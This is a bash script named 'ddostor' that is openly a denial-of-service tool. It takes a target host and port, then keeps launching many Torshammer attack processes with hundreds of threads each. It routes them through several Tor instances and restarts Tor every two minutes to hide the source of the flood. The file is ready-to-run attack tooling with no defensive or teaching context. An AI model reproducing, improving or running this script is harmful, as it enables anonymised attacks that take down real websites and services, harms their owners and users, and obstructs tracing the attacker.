#!/bin/bash
# ddostor: DDoS Tool v1.0 using Torshammer
# Coded by @thelinuxchoice
# Github: https://github.com/thelinuxchoice/ddostor


trap 'printf "\n";stop;exit 1' 2

checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
   printf "\e[1;77m Please, run this program as root!\n \e[0m"
   exit 1
fi
}

changeip() {


killall -HUP tor

}

banner() {

printf "\e[1;93m  ____  ____       ____ \e[0m \e[1;77m  _             \e[0m\n"
printf "\e[1;93m |  _ \|  _ \  ___/ ___| \e[0m\e[1;77m | |_ ___  _ __  \e[0m\n"
printf "\e[1;93m | | | | | | |/ _ \___ \ \e[0m\e[1;77m | __/ _ \| '__| \e[0m\n"
printf "\e[1;93m | |_| | |_| | (_) |__) |\e[0m\e[1;77m | || (_) | |    \e[0m\n"
printf "\e[1;93m |____/|____/ \___/____/\e[0m\e[1;77m   \__\___/|_|    v1.0\e[0m\n"
printf "                                          \n"
printf "\e[1;92m  .::.\e[0m\e[1;77m DDoS Tool by @thelinuxchoice  \e[0m\e[1;92m.::.\e[0m\n\n"


}

config() {
default_portt="80"
default_threads="600"

default_tor="y"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Target: \e[0m' target
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Port \e[0m\e[1;77m(Default 80): \e[0m' portt
portt="${portt:-${default_portt}}"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Threads: \e[0m\e[1;77m(Default 600): \e[0m' threads
threads="${threads:-${default_threads}}"

inst="${inst:-${default_inst}}"
read -e -p $'\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m] Anonymized via Tor? \e[0m\e[1;77m[Y/n]: \e[0m' tor
printf "\e[0m"
tor="${tor:-${default_tor}}"
if [[ $tor == "y" || $tor == "Y" ]]; then
readinst
printf "\e[1;93m[*] Press Ctrl + C to stop attack \e[0m \n"
attacktor
else

attack

fi
}



readinst() {
default_inst="3"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Tor instances \e[0m\e[1;77m(default: 3): \e[0m' inst
inst="${inst:-${default_inst}}"
multitor
}


attacktor() {
#let i=1
while true; do
  let ii=1
  while [ $ii -le $inst ]; do
porttor=$((9050+$ii))
#printf "\e[1;92m[*] Attack through Tor Port: %s\e[0m\n" $porttor
gnome-terminal -- torsocks -P $porttor python tools/ddostor/torshammer/torshammer.py -t $target -p $portt -r $threads
ii=$((ii+1))
done
sleep 120
changeip
killall python
let i=1
let porttor=$((9050+$i))
done
}

attack() {
default_inst="4"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Terminals \e[0m\e[1;77m(Default 4): \e[0m' inst
printf "\e[1;93m[*] Press Ctrl + C to stop attack \e[0m \n"
inst="${inst:-${default_inst}}"
i=1
while true; do
  let i=1
  while [[ $i -le $inst ]]; do

gnome-terminal -- python tools/ddostor/torshammer/torshammer.py -t $target -p $portt -r $threads
i=$((i+1))
done
sleep 120
killall python
done
}

checktor() {
let i=1
checkcount=0 
while [[ $i -le $inst ]]; do
port=$((9050+$i))
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Checking Tor connection on port:\e[0m\e[1;77m %s\e[0m..." $port

check=$(curl --socks5-hostname localhost:$port -s https://www.google.com > /dev/null; echo $?) 
if [[ "$check" -gt 0 ]]; then 
printf "\e[1;91mFAIL!\e[0m\n" 
else 
printf "\e[1;92mOK!\e[0m\n" 
let checkcount++ 
fi
i=$((i+1))
done

if [[ $checkcount != $inst ]]; then
printf "\e[1;93m[!] It requires all tor running!\e[0m\n"
printf "\e[1;77m1) Check again\e[0m\n"
printf "\e[1;77m2) Restart\n\e[0m"
printf "\e[1;77m2) Exit\n\e[0m"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' fail  


if [[ $fail == "1" ]]; then
checktor
elif [[ $fail == "2" ]]; then
stop
multitor
elif [[ $fail == "3" ]]; then
exit 1
else
printf "\e[1;93m[!] Invalid option, exiting...!\e[0m\n"
exit 1
fi
fi
}

multitor() {


if [[ ! -d multitor ]]; then 
mkdir multitor;
fi
default_ins="1"
inst="${inst:-${default_inst}}"

let i=1
while [[ $i -le $inst ]]; do
port=$((9050+$i))
printf "SOCKSPort %s\nDataDirectory /var/lib/tor%s" $port $i > multitor/multitor$i 
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Tor on port:\e[0m\e[1;77m 905%s\e[0m\n" $i 
tor -f multitor/multitor$i > /dev/null &
sleep 10
i=$((i+1))
done
checktor
}

stop() {

killall -2 tor > /dev/null 2>&1
printf "\e[1;92m[*] All Tor connection stopped.\e[0m\n"
}

#banner
checkroot
config


